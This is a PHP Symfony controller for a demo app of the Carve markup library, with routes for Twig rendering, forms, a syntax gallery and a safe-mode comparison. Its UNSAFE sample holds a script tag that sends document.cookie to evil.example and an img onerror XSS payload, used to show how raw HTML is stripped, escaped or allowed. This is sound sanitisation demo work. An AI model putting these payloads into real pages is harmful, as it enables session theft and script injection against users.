<?php

declare(strict_types=1);

namespace App\Controller;

use App\Entity\Article;
use App\Form\ArticleType;
use MarkupCarve\Carve\SafeMode;
use MarkupCarve\Symfony\CarveRenderer;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;

class DemoController extends AbstractController
{
    private const SAMPLE = <<<'CARVE'
        # Welcome to Carve

        This is a paragraph with /italic/, *bold*, and _underline_ text.

        ## Features

        - Clean, consistent syntax
        - [x] Task lists work
        - [ ] Even unchecked ones

        > Carve is Djot minus the footguns.

        ### Code

        ``` php
        $html = (new CarveConverter())->convert('Hello *world*');
        ```

        Visit [the spec](https://github.com/markup-carve/carve) for the details.
        CARVE;

    private const UNSAFE = <<<'CARVE'
        # User Post

        Normal content here.

        <script>document.location='https://evil.example/?c='+document.cookie</script>

        <img src="x" onerror="alert('xss')">

        More normal content.
        CARVE;

    #[Route('/', name: 'home')]
    public function index(): Response
    {
        return $this->render('demo/index.html.twig');
    }

    #[Route('/twig-filter', name: 'twig_filter')]
    public function twigFilter(): Response
    {
        return $this->render('demo/twig_filter.html.twig', [
            'source' => self::SAMPLE,
        ]);
    }

    #[Route('/twig-function', name: 'twig_function')]
    public function twigFunction(): Response
    {
        return $this->render('demo/twig_function.html.twig', [
            'source' => self::SAMPLE,
        ]);
    }

    #[Route('/service', name: 'service')]
    public function service(CarveRenderer $carve): Response
    {
        return $this->render('demo/service.html.twig', [
            'source' => self::SAMPLE,
            'html' => $carve->render(self::SAMPLE),
        ]);
    }

    #[Route('/form', name: 'form')]
    public function form(Request $request, CarveRenderer $carve): Response
    {
        $article = new Article();
        $article->setBody(self::SAMPLE);

        $form = $this->createForm(ArticleType::class, $article);
        $form->handleRequest($request);

        $preview = null;
        if ($form->isSubmitted() && $form->isValid()) {
            $preview = [
                'title' => $article->getTitle(),
                'body_html' => $carve->render($article->getBody()),
                'comment_html' => $article->getComment() !== null && $article->getComment() !== ''
                    ? $carve->render($article->getComment())
                    : null,
            ];
        }

        return $this->render('demo/form.html.twig', [
            'form' => $form,
            'preview' => $preview,
        ]);
    }

    #[Route('/safe-mode', name: 'safe_mode')]
    public function safeMode(): Response
    {
        return $this->render('demo/safe_mode.html.twig', [
            'source' => self::UNSAFE,
            'strip' => (new CarveRenderer(true, SafeMode::RAW_HTML_STRIP))->render(self::UNSAFE),
            'escape' => (new CarveRenderer(true, SafeMode::RAW_HTML_ESCAPE))->render(self::UNSAFE),
            'allow' => (new CarveRenderer(true, SafeMode::RAW_HTML_ALLOW))->render(self::UNSAFE),
            'disabled' => (new CarveRenderer(false))->render(self::UNSAFE),
        ]);
    }

    #[Route('/syntax', name: 'syntax')]
    public function syntax(CarveRenderer $carve): Response
    {
        $examples = [
            'Headings' => "# Heading 1\n## Heading 2\n### Heading 3",
            'Emphasis' => "/italic/\n\n*bold*\n\n_underline_\n\n=highlight=\n\n~strikethrough~",
            'Lists' => "- one\n- two\n  - nested\n\n1. first\n2. second",
            'Task list' => "- [x] done\n- [ ] todo",
            'Blockquote' => "> A quote\n> spanning lines.",
            'Link & image' => "[Carve spec](https://github.com/markup-carve/carve)",
            'Table' => "| Lang | Status |\n|------|--------|\n| PHP  | ready  |\n| JS   | ready  |",
            'Admonition' => "::: note\nThis is a note admonition.\n:::",
        ];

        $rendered = [];
        foreach ($examples as $label => $src) {
            $rendered[$label] = ['source' => $src, 'html' => $carve->render($src)];
        }

        return $this->render('demo/syntax.html.twig', [
            'examples' => $rendered,
        ]);
    }
}
